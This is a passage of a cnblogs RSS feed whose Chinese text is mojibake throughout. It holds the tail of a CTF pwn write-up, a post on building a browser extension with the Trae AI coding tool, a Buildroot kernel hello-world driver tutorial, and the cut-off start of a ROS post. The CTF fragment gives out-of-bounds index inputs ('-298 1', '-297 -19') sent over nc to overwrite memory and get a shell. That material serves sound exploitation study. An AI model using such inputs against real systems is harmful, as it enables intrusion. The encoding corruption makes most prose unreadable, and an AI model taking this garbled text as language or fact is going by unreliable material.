map[20 * n19 + n19_1]=0ï¼æä»¥å°±éä¾¿æ­éä¸ä¸n19ån19_1ååºæ¥-5959å°±å¯ä»¥äºï¼è¿éæ³¨æn19ï¼n19_1ä¸è½å¤§äº19å°±å¯ä»¥äºï¼æ¯å¦-298*20  1<br>
æè-297 *20  -19é½å¯ä»¥ãè¿æ ·æä»¬åªéè¦ncä¸å»ï¼åéä¾¿ä¸ä¸ä¸ªå°æ¹ï¼åè¾å¥-298 1æè-297 -19å°±getshelläºãææå¦ä¸ã<br>
<img alt="IX4X{`$K@{BILRR~N4HWRU" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195527221-893112637.png" class="lazyload"></p>
<p><img alt="09NCIA80SBA}{@1)(R7IAU" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195548018-1644470998.png" class="lazyload"></p>
<p><img alt="R6ISE2(U50D_B%M2_XEW0" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195605591-325774318.png" class="lazyload"></p>
<p>è¿é¢æè§è®¾è®¡çæºå¥½çï¼æç¹ææï¼è½ç¶éåäºæå¥½ä¹...</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-18 20:05">2026-01-18 20:04</span>&nbsp;
<a href="https://www.cnblogs.com/firefly-star">firefly_star</a>&nbsp;
éè¯»(<span id="post_view_count">38</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19499036);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19499036', targetLink: 'https://www.cnblogs.com/firefly-star/p/19499036', title: 'æ çä¸ä¸ªmagic gadgetçè¿ç¨ä»¥åæ°ç»è¶ç' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ åå«ä»£ç ï¼æç¨Traeæ°å´ç¼ç¨çæ¹å¼ï¼å¼åäºä¸æ¬¾å¬ä¼å·æç« åæ­¥æä»¶ï¼ ]]></title>
    <link>https://www.cnblogs.com/chingho/p/19498962</link>
    <guid>8361f557ebd05ac9e58699125da9270b</guid>
    <description>
    <![CDATA[ 
		<h1 class="postTitle">
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/chingho/p/19498962" title="åå¸äº 2026-01-18 19:02">
    <span role="heading" aria-level="2">åå«ä»£ç ï¼æç¨Traeæ°å´ç¼ç¨çæ¹å¼ï¼å¼åäºä¸æ¬¾å¬ä¼å·æç« åæ­¥æä»¶ï¼</span>
    

</a>

		</h1>
		<div class="clear"></div>
		<div class="postBody">
			    <div id="cnblogs_post_description" style="display: none">
        
        å¤§å®¶å¥½ï¼ææ¯ç¼ç¨ä¹è¶£ãæå©ç¨å¨æ«æ¶é´ï¼æ²¡æåä»»ä½ä¸è¡ä»£ç ï¼ç¨Traeæ°å´ç¼ç¨çæ¹å¼ï¼å®æä¸ä¸ªæµè§å¨æä»¶çå¼åãæå¤§çæåæ¯ï¼æªæ¥ç¼ç¨æ¹å¼ï¼å¯¹éè¯»ä»£ç ãä»£ç è¯­æ³ãç¼ç¨è¯­è¨ç­è½ååå¾ä¸åéè¦ï¼æå¾ä¸AIå¯¹æ¹ææ¯æéè¦çè½åãä¸é¢åå¤§å®¶åäº«ä¸ï¼æå¼åè¿æ¬¾æä»¶çå®æ´è¿ç¨ä¸æåãè¯¥æä»¶æå·²ç»å¨Githubå¼æºäºï¼å¤§å®¶èªè¡ææ«è·åãä¸ãæä»¶äº§åä»ç»# äº§åç®ä»

ä¸ä¸ªæµè§å¨æä»¶ï¼ç¨äºå¨å¬ä¼å·æç« é¡µé¢èªå¨æ¾ç¤ºå...
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><span>å¤§å®¶å¥½ï¼ææ¯ç¼ç¨ä¹è¶£ã</span><span>æå©ç¨å¨æ«æ¶é´ï¼<span>æ²¡æåä»»ä½ä¸è¡ä»£ç ï¼<span>ç¨Traeæ°å´ç¼ç¨çæ¹å¼ï¼<span>å®æä¸ä¸ªæµè§å¨æä»¶çå¼åã</span></span></span></span><span><span>æå¤§çæåæ¯ï¼æªæ¥ç¼ç¨æ¹å¼ï¼å¯¹éè¯»ä»£ç ãä»£ç è¯­æ³ãç¼ç¨è¯­è¨ç­è½ååå¾ä¸åéè¦ï¼æå¾ä¸AIå¯¹æ¹ææ¯æéè¦çè½åã</span></span><span>ä¸é¢åå¤§å®¶åäº«ä¸ï¼æå¼åè¿æ¬¾æä»¶çå®æ´è¿ç¨ä¸æåã</span></p>
<p><strong>è¯¥æä»¶æå·²ç»å¨Githubå¼æºäºï¼å¤§å®¶èªè¡ææ«è·åã</strong></p>
<p>&nbsp;</p>
<p><strong>ä¸ãæä»¶äº§åä»ç»</strong></p>
<p data-pm-slice="0 0 []"><strong># äº§åç®ä»</strong></p>
<p data-pm-slice="0 0 []">ä¸ä¸ªæµè§å¨æä»¶ï¼ç¨äºå¨å¬ä¼å·æç« é¡µé¢èªå¨æ¾ç¤ºåæ­¥æé®ï¼æ¯æä¸é®åæ­¥å°å¤ä¸ªå¹³å°ã</p>
<img src="https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024657-790542621.png" alt="å¾ç" class="rich_pages wxw-img" data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/tJJDa2wmJiaqLOAEogvriaWicMQ1OBBdRaJOANvibLiaaUQfKvib7vZEOTXgj67CgZo8ue0DuaEYK1k0TOwzTh9Drp4w/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1#imgIndex=0" data-ratio="0.4925925925925926" data-s="300,640" data-type="png" data-w="1080" data-imgfileid="302462737" data-aistatus="1" data-original-style="null" data-index="2" data-report-img-idx="0" data-fail="0">
<p data-pm-slice="0 0 []"><strong># åè½ç¹æ§</strong></p>
<p>-&nbsp;ð¤ å¨å¬ä¼å·æç« é¡µé¢èªå¨æ³¨å¥åæ­¥æé®</p>
<p>-&nbsp;ð æ¯æä¸é®åæ­¥å°å¤ä¸ªå¹³å°</p>
<p>-&nbsp;â æ¯æå¹³å°å¾ééæ©</p>
<p>-&nbsp;ð¨ ç¾è§æç¨çUIçé¢</p>
<p><strong># å½åæ¯æçå¹³å°</strong></p>
<p>-&nbsp;ð CSDN</p>
<p>-&nbsp;ð« åå®¢å­</p>
<p>-&nbsp;ð§  ç¥ä¹</p>
<p>-&nbsp;ð° ä»æ¥å¤´æ¡</p>
<p><span>&nbsp;</span></p>
<p><strong>äºãå¼åå®æ´æ­¥éª¤æµç¨</strong></p>
<p><span><span>ç±äºå¼åè¿ç¨ä¸­ï¼æ²¡ææªå¾ï¼æåªè½éè¿æå­æ¥åå¤§å®¶åäº«ã</span></span></p>
<span><span>1ãæåè¯Traeï¼æè¦å¼åä¸æ¬¾å¬ä¼å·æç« åæ­¥æµè§å¨æä»¶ï¼å¹¶ç½åè¦æ¯æçå¹³å°ãéè¦å®æçåè½ã</span></span><span><span>Traeï¼å¯ä»¥å®æ´çææä»¶ä»£ç ï¼åæ¶ä¼çælogoå¾ççéç½®ä¿¡æ¯ãä½æ²¡æçælogoå¾çã</span></span><img src="https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024519-1701600050.png" alt="å¾ç" class="rich_pages wxw-img" data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/tJJDa2wmJiaqLOAEogvriaWicMQ1OBBdRaJJTB3SWVpzmEovMP5K2IOLQLH5ia1NszNj5RQMAtvT6eQ4pyKyHl6HBA/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1#imgIndex=1" data-ratio="0.42752562225475843" data-s="300,640" data-type="png" data-w="683" data-imgfileid="302462738" data-aistatus="1" data-original-style="null" data-index="3" data-report-img-idx="1" data-fail="0"><span><span>2ã<span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]">æåè¯Traeï¼å¸®æçæä¸ä¸ªlogoå¾çï¼ç¨äºåè¿ä¸ªæµè§å¨æä»¶å¾æ ãè¿ä¸ªäº§åæååä¸ºï¼OneClickï¼<span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]">è®¾è®¡è¦æ±ï¼<span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]">logoç¨äº§ååãç»¿è²èæ¯ã</span></span></span></span></span><img src="https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024555-1868309316.png" alt="å¾ç" class="rich_pages wxw-img" data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/tJJDa2wmJiaqLOAEogvriaWicMQ1OBBdRaJGaTu0iamkoKvX9ayaRoX8YD97hXvtjxLjLcd8DBoHRp3GVjeSMtC3pw/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1#imgIndex=2" data-ratio="0.3232104121475054" data-s="300,640" data-type="png" data-w="461" data-imgfileid="302462739" data-aistatus="1" data-original-style="null" data-index="4" data-report-img-idx="2" data-fail="0"><span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]"><span>Traeï¼<span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]"><br></span></span></span>
<ul class="list-paddingleft-1">
<li><span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]">Traeä¼æ£æµæçµèç¯å¢æ¯å¦å®è£nodeï¼å¹¶ä½¿ç¨nodeçælogoå¾çï¼ä½æ§è¡è¿ç¨ä¸­åç°ænodeçæ¬è¿ä½ï¼æç¤ºæè¦å®è£nodeç¸å³æä»¶ã</span></li>
<li><span>æçµèæå®è£å¤ä¸ªnodeçæ¬ï¼Traeæ²¡ææ£æµæçµèæ¯å¦å­å¨å¤ä¸ªçæ¬ï¼ç´æ¥æç¤ºæç¼ºå°ç¸å³æä»¶ï¼å¹¶ç»åº<span>ç¡®è®¤æé®ï¼é®ææ¯å¦è¦å®è£æä»¶ï¼è¿è¾¹éè¦æäººå·¥ç¹å»ç¡®è®¤ã</span></span></li>
<li><span><span>æç¹å»ç¡®è®¤åï¼Tradeèªå¨çælogo.svgæä»¶ï¼å¹¶æ ¹æ®è¦æ±çæä¸åå°ºå¯¸çlogoæä»¶ã</span></span></li>



</ul>



<span><br></span><span><span>3ã<span>å®æä»¥ä¸æ­¥éª¤åï¼æææä»¶å¯¼å¥å°Chromeæµè§å¨ï¼å¹¶å°è¯è¿è¡ã<span>ç»æå¹¶ä¸è½å®æ´è¿è¡ã</span></span></span></span>
<ul class="list-paddingleft-1">
<li><span>æä»¶å®ç°æ¹å¼ï¼æå¼ä¸åæ ç­¾é¡µé¢ï¼å¹¶èªå¨å¡«åæ é¢ãåå®¹ãæé¨åå¹³å°å¯ä»¥æ­£ç¡®å¡«åï¼æäºä¸è¡ã</span></li>



</ul>



<span><br></span><span><span>4ã<span>æåè¯Traeï¼<span>ä¸è¦ä½¿ç¨æå¼ä¸åæ ç­¾é¡µé¢çæ¹å¼<span>ï¼æ¹ä¸ºåå°èªå¨è¿è¡çæ¹å¼ã</span></span></span></span></span><span><span>Trae<span>ï¼å¯ä»¥æ­£ç¡®çè§£æè¦ä½¿ç¨ApIçæ¹å¼ï¼å¹¶è¿è¡ä¿®æ¹ã</span></span></span><span><br></span><span><span>5ãå®æä¿®æ¹åï¼æè¿è¡æµè¯ï¼ä¾ç¶æ¯æ æ³å®æåæ­¥ã</span></span><span><span>6ã<span>æ¥ä¸å»çå è½®å¯¹è¯ä¸­ï¼<span>æä¸æ­åè¯Traeï¼åæ­¥åè½æé®é¢ï¼æä»¶çé¢ææ¾ç¤ºåæ­¥éè¯¯æåµï¼æä¹æéè¯¯æåµåéç»Trae<span>ï¼Traeä¹ä¸æ­çè¿è¡ä»£ç ä¿®æ¹ï¼æç»ä¹æ¯ä¸è½å®ç°ã</span></span></span></span></span><span><span>7ã<span>æåäºä¸ä¸ªæ¹åï¼æ¥çæµè§å¨çè¿è¡æ¥å¿ãå¹¶ææ´è¯¦ç»éè¯¯æ¥å¿åéç»TraeãTraeæ ¹æ®æ´è¯¦ç»æ¥å¿ï¼ä¹ä¿®å¤å ä¸ªBugï¼ä½å¹¶ä¸è½å®æ´å®ç°åæ­¥åè½ã</span></span></span><span><span>8ã<span>ç»è¿å¥½å è½®çå¯¹è¯ï¼å¹¶ä¸è½å®ç°ææ³è¦çåè½ï¼<span>æäºæ¯è®©Traeæå°æ´è¯¦ç»çæ¥å¿ï¼æ¹ä¾¿æç»å¥¹åé¦<span>ãTraeä¿®æ¹ä»£ç ï¼å¹¶æå°æ´è¯¦ç»çæ¥å¿ã</span></span></span></span></span><img src="https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024519-743493286.webp" alt="å¾ç" class="rich_pages wxw-img" data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/tJJDa2wmJiaqLOAEogvriaWicMQ1OBBdRaJUj3noGSrGdnk3riaCFSibYgfr5Dj9kyCzVdSmn3ak52KX7K00DHIiaibRA/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1#imgIndex=3" data-ratio="0.38796296296296295" data-s="300,640" data-type="png" data-w="1080" data-imgfileid="302462740" data-aistatus="1" data-original-style="null" data-index="5" data-report-img-idx="3" data-fail="0"><span><span>9<span>ãç»§ç»­ç»è¿å¥½å è½®å¯¹è¯ï¼è¿æ¯ä¸è½æ­£ç¡®å®ç°åè½ãéè¿æ¥å¿æ¥çï¼Traeæäº¤çAPIï¼å¹¶ä¸æ¯æ­£ç¡®çã<span>è¿ä¸ªæ¯ç±äºåä¸ªå¹³å°ï¼å¹¶æ²¡æå¬å¼çAPIææ¡£<span>ï¼æä»¥Traeæ¯éè¿æç´¢ç½ç»ææ¡£åçæµçæ¹å¼ï¼ä¸æ­ä¿®æ¹ä»£ç ã</span></span></span></span></span><span><span>10ã<span>ç±äºä¸è½å®ç°åè½ï¼æåªè½æ¯å°åä¸ªå¹³å°ï¼æå¨æä½ä¿å­æç« èç¨¿ï¼å¹¶éè¿æµè§å¨æä»¶ï¼æåç¸å³çæ¥å£Urlãè¯·æ±æ å¤´ãæäº¤æ¥æç­ä¿¡æ¯ã</span></span></span>
<ul class="list-paddingleft-1">
<li><span>æäºå¹³å°æ¯æmarkdownãæäºåªè½æ¯å¯ææ¬å½¢å¼ã</span></li>
<li><span>æåå¾çä¸ä¼ æ¥å£ãä¿å­èç¨¿çæ¥å£çç¸å³æ¥æã</span></li>



</ul>
<p>

<span><br></span><img src="https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024613-576081230.webp" alt="å¾ç" class="rich_pages wxw-img" data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/tJJDa2wmJiaqLOAEogvriaWicMQ1OBBdRaJsicjOfJvUanKic1lz60uibQtkib6fR9xRBvJ2oJM4TMywmTEaTDYscgYdg/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1#imgIndex=4" data-ratio="0.4962962962962963" data-s="300,640" data-type="png" data-w="1080" data-imgfileid="302462741" data-aistatus="1" data-original-style="null" data-index="6" data-report-img-idx="4" data-fail="0"><span><span>11<span>ãéè¿æç»çæ¥æï¼æä»¶å¯ä»¥æ­£ç¡®æäº¤ï¼ä½é½æç¤ºæªç»å½ãæèæ²¡æéãæåè¯Traeï¼åå«åè®¿é®åä¸ªå¹³å°åå°ï¼ææ´çåä¸ªå¹³å°åå°Urlï¼ï¼å¹¶è·åCookieå¹¶ç±äºæ¥å£æäº¤ã</span></span></span><span><span>12<span>ãéè¿ä»¥ä¸çæ¹å¼ï¼å¹¶ç»åæå°çæ¥å¿ï¼æä¸åè®©Traeè°æ´ï¼æç»å®æ´å®ç°åè½ã</span></span></span><span><br></span></p>
<p><strong><span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]">ä¸ãå¼åæ»ç»</span></strong></p>
<p><span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]"><span>1ãå¨è¿è¿ç¨ä¸­ï¼ææ²¡ææå¨<span>ç¼åä»»ä½ä¸è¡ä»£ç <span>ã</span></span></span></span></p>
<p><span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]"><span>2ãä¸åéè¦éè¯»ä»£ç ï¼<span>åªè¦æéè¯¯æ¥å¿åé¦ç»AIï¼AIå°±è½æ­£ç¡®çä¿®æ¹<span>ã</span></span></span></span></p>
<p><span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]"><span>3ãè¿ç¨ä¸­ï¼ä¸ç´æ æ³å®ç°åè½ï¼<span>è®°å¾è¦æ±AIæå°æ´è¯¦ç»çæ¥å¿<span>ï¼<span>æ¹ä¾¿æä»¬ç»AIåé¦ã</span></span></span></span></span></p>
<p><span data-pm-slice="1 1 [&quot;para&quot;,{&quot;tagName&quot;:&quot;section&quot;,&quot;attributes&quot;:{},&quot;namespaceURI&quot;:&quot;http://www.w3.org/1999/xhtml&quot;}]"><span>4ãè½ç¶ä¸ç¨ç¼åä»£ç ãéè¯»ä»£ç ï¼ä½<span>å¯¹å®ç°åçè¿è¦ç¥éç<span>ãå¦åï¼æå°±ä¸æéè¿æ¥çæµè§å¨æ¥æçå½¢å¼ï¼ç»AIåé¦äºã</span></span></span></span></p>
<p><span><span>æå<span>ï¼ç°å¨å¯¹ç¨åºåçè¦æ±å·²ç»å®å¨åäºãä»£ç è¯­æ³ãä»£ç è§èãç¼ç¨è¯­è¨ç­è¿å»è¦æ±çè½åï¼åå¾è¶æ¥è¶ä¸éè¦äºã</span></span></span><span><span>ä½ åªéæå¾åç§åçãåç§ç¥è¯ç¹çæ¦å¿µï¼å°±è½å®ç°å¼åäºã</span></span></p>
<p><span><br></span><strong>åãæä»¶ä¸è½½</strong></p>
<p><span><span>ä»£ç æå·²ç»æäº¤å°Githubï¼å¤§å®¶å¯ä»¥èªè¡ä¸è½½ï¼æèç½çä¸è½½ã</span></span></p>
<p><span><span>å¼æºé¡¹ç®ï¼<span><br></span></span></span><span>https://github.com/bianchenglequ/OneClick</span></p>
<p><span><span>ç½çä¸è½½ï¼<span><br></span></span></span><span>https://pan.quark.cn/s/9ef2717f5203</span></p>
</div>
<div class="clear"></div>

		</div>
		<div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.07777777777777778" data-date-updated="2026-01-18 20:54">2026-01-18 19:02</span>&nbsp;
<a href="https://www.cnblogs.com/chingho">chingho</a>&nbsp;
éè¯»(<span id="post_view_count">108</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19498962);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19498962', targetLink: 'https://www.cnblogs.com/chingho/p/19498962', title: 'åå«ä»£ç ï¼æç¨Traeæ°å´ç¼ç¨çæ¹å¼ï¼å¼åäºä¸æ¬¾å¬ä¼å·æç« åæ­¥æä»¶ï¼' })">ä¸¾æ¥</a>
</div>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ç¼åä¸ä¸ªBuildroot åæ ¸é©±å¨ ]]></title>
    <link>https://www.cnblogs.com/tianwuyvlianshui/p/19498842</link>
    <guid>b92c3d09adb0d056cc24005a777b1f9d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/tianwuyvlianshui/p/19498842" title="åå¸äº 2026-01-18 17:40">
    <span role="heading" aria-level="2">ç¼åä¸ä¸ªBuildroot åæ ¸é©±å¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ç¼åä¸ä¸ªbuildroot-åæ ¸é©±å¨">ç¼åä¸ä¸ªBuildroot åæ ¸é©±å¨</h1>
<blockquote>
<p>PS:åæ ¸é©±å¨åªè½å¨<strong>/kernel/drivers/</strong>ç®å½ä¸</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173751023-892940144.png" alt="image-20260117082757215" loading="lazy"></p>
<h2 id="makefileæä»¶çç¼å">Makefileæä»¶çç¼å</h2>
<blockquote>
<p>ä¸»è¦æ³¨æMakefileæä»¶çç¼åï¼è·¯å¾ï¼åå«ï¼</p>
<p>å¨è¯¥è·¯å¾ä¸åæ°å»ºä¸ä¸ªç¨æ·åæ ¸é©±å¨æä»¶å¤¹ï¼ç¨äºå­æ¾ç¨æ·ç¼åçé©±å¨</p>
<p><strong>user_rk3566_-kernel-driver</strong></p>
<p>è¿å¥è¯¥æä»¶å¤¹ï¼æ°å»ºä¸ä¸ª02åºå·ç¨æ·é©±å¨æä»¶å¤¹ï¼ç¨äºå­æ¾02é©±å¨</p>
<p><strong>02_kernel_helloworld</strong></p>
<p>ç¼åkernel/drivers/user_rk3566_-kernel-driver/02_kernel_helloworldè·¯å¾ä¸çMakefileï¼æ·»å é©±å¨æºæä»¶<strong>02_kernel_helloworld.c</strong>è¿ç¼è¯ï¼</p>
<pre><code>vim Makefile
</code></pre>
<p>Makefileï¼</p>
<pre><code>#obj-y :åæ ¸é©±å¨
#obj-m :æ¨¡åé©±å¨
obj-y += 02_hello_world.o
</code></pre>
<p>è¿åå°<strong>kernel/drivers/user_rk3566_-kernel-driver</strong>è·¯å¾ï¼æ·»å Makefileï¼æ·»å é©±å¨æºæä»¶çæä»¶å¤¹<strong>02_kernel_helloworld/</strong>è¿ç¼è¯ï¼</p>
<p>Makefileï¼</p>
<pre><code>#æ·»å é©±å¨æä»¶æå¨æä»¶å¤¹è¿ç¼è¯ï¼éè¦å¸¦â/âç¬¦å·ï¼è¡¨ç¤ºç®å½ï¼æä»¶å¤¹ï¼
obj-y += 02_kernel_helloworld/
</code></pre>
<p>è¿åå°<strong>kernel/drivers</strong>è·¯å¾ï¼æ·»å Makefileï¼æ·»å é©±å¨æºæä»¶çæä»¶å¤¹user_rk3566_-kernel-driver/è¿ç¼è¯ï¼</p>
<p>Makefileï¼</p>
<pre><code>obj-y +=/user_rk3566_-kernel-driver/
</code></pre>
<p>éä¾¿æ¾ä¸ªå°æ¹ï¼ææä»¶å¤¹è·¯å¾ä¸¢è¿å»</p>
</blockquote>
<img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173754308-308553245.png" alt="image-20260118171936747" style="zoom: 33%">
<blockquote>
<p>OK,ç±äºSDKè·¯å¾çMakefileæä»¶å·²ç»å°kernel/driversè·¯å¾æ·»å ï¼æä»¬å°±ä¸éè¦èªå·±æå¨æ·»å </p>
<p>ä»¥ä¸å°±æ¯æéè¦æ·»å çMakefileæä»¶ã</p>
<p>ä¸»è¦ç®çæ¯åè¯makeå·¥å·å¨<strong>kernel/drivers/user_rk3566_-kernel-driver/02_kernel_helloworld</strong>è·¯å¾ä¸æ¯æä»¬çé©±å¨æºä»£ç <strong>02_kernel_helloworld.c</strong>ï¼éè¦æ·»å è¿ç¼è¯</p>
</blockquote>
<h2 id="é©±å¨æä»¶ç¼å">é©±å¨æä»¶ç¼å</h2>
<blockquote>
<p>è¿å¥è¯¥02_kernel_helloworldï¼å¼å§é©±å¨ç¼å</p>
<pre><code>vim 02_hello_world.c 
</code></pre>
<p>02_hello_world.c</p>
<pre><code class="language-c">#include &lt;linux/module.h&gt;     /* æ¨¡åç¸å³å®åå½æ° */
#include &lt;linux/kernel.h&gt;     /* printkæ¥å¿å½æ° */

/* å è½½å½æ°ï¼é©±å¨å¥å£ï¼ï¼å½é©±å¨è¢« insmod å è½½æ¶èªå¨æ§è¡ */
static int __init helloworld_init(void)
{
    printk("02_helloworld_init\r\n"); // åæ ¸æ¥å¿æå°
    return 0; // è¿å0ä»£è¡¨å è½½æå
}

/* å¸è½½å½æ°ï¼é©±å¨åºå£ï¼ï¼å½é©±å¨è¢« rmmod å¸è½½æ¶èªå¨æ§è¡ */
static void __exit helloworld_exit(void)
{
    printk("02_helloworld_exit\r\n");
}

/* ä¸é¢è¿ä¸¤è¡ï¼åè¯åæ ¸å¥å£ååºå£åå«æ¯åªä¸¤ä¸ªå½æ° */
module_init(helloworld_init);
module_exit(helloworld_exit);

/* è¿3ä¸ªæ¯æ¨¡åä¿¡æ¯å£°æ */
MODULE_LICENSE("GPL v2");               /* æ¨¡åè®¸å¯è¯ */

</code></pre>
</blockquote>
<h2 id="ç¼è¯">ç¼è¯</h2>
<p>æä»¬éè¦è¿åå°kernelåæ ¸æä»¶å¤¹çä¸ä¸ä¸ªè·¯å¾</p>
<p>å¨æè¿æ¯SDK/ï¼è¿éåå«äºç¼è¯èæ¬ï¼é¡»å¨è¿éè¿è¡ç¼è¯å½ä»¤</p>
<pre><code>./build.sh kernel
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173751745-1600325666.png" alt="image-20260118172404378" loading="lazy"></p>
<p>ç¼è¯æå</p>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173752421-1683639729.png" alt="image-20260118172442489" loading="lazy"></p>
<p>è¿åæºä»£ç è·¯å¾æ¥çç¼è¯æä»¶ï¼å¯éï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173752940-2085711302.png" alt="image-20260118163216910" loading="lazy"></p>
<p>å¯ä»¥çå°ï¼åæ ¸é©±å¨ç¼è¯åï¼ä¸ä¼åæ¨¡åé©±å¨é£æ ·çæ<strong>.ko</strong>æä»¶</p>
<p>å®éï¼é©±å¨ç¸å³çåå®¹å·²ç»ç¼è¯è¿åæ ¸éåä¸­ï¼root.imgï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173753283-1927509773.png" alt="image-20260118172723586" loading="lazy"></p>
<h2 id="è¿è¡">è¿è¡</h2>
<p>å°è¯¥éåç§å½ï¼ç­æ¿å­è¿è¡åæ¥çæ¥å¿</p>
<pre><code>dmesg | grep -E hello
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173753691-118600053.png" alt="image-20260118173111518" loading="lazy"></p>
<p>å¯ä»¥çå°é©±å¨ä¸çµåèªå¨è¿è¡ï¼è¿å°±æ¯åæ¨¡åé©±å¨çä¸ä¸ªæ¾èåºå«ï¼ä¸éè¦æå¨æè½½</p>
<p>ä¿®æ¹å®åï¼gitæäº¤ä¸ä¸ä»£ç æ´æ¹ï¼å¯éï¼</p>
<pre><code>git add .
git commit -m"ä¿®æ¹è¯´æ"
git pull
git push
</code></pre>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-18 17:41">2026-01-18 17:40</span>&nbsp;
<a href="https://www.cnblogs.com/tianwuyvlianshui">æ²æç¦»</a>&nbsp;
éè¯»(<span id="post_view_count">44</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19498842);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19498842', targetLink: 'https://www.cnblogs.com/tianwuyvlianshui/p/19498842', title: 'ç¼åä¸ä¸ªBuildroot åæ ¸é©±å¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ROS1 noetic ä¸­å° Unitree G1 åºäº Gazebo/RViz å³èèå¨ãåºäº Gazebo ç¶æåé¦ã ]]></title>
    <link>https://www.cnblogs.com/zylyehuo/p/19498596</link>
    <guid>2b0cd046e352ed29823ea855ea9ab45d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/zylyehuo/p/19498596" title="åå¸äº 2026-01-18 15:37">
    <span role="heading" aria-level="2">ROS1 noetic ä¸­å° Unitree G1 åºäº Gazebo/RViz å³èèå¨ãåºäº Gazebo ç¶æåé¦ã</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
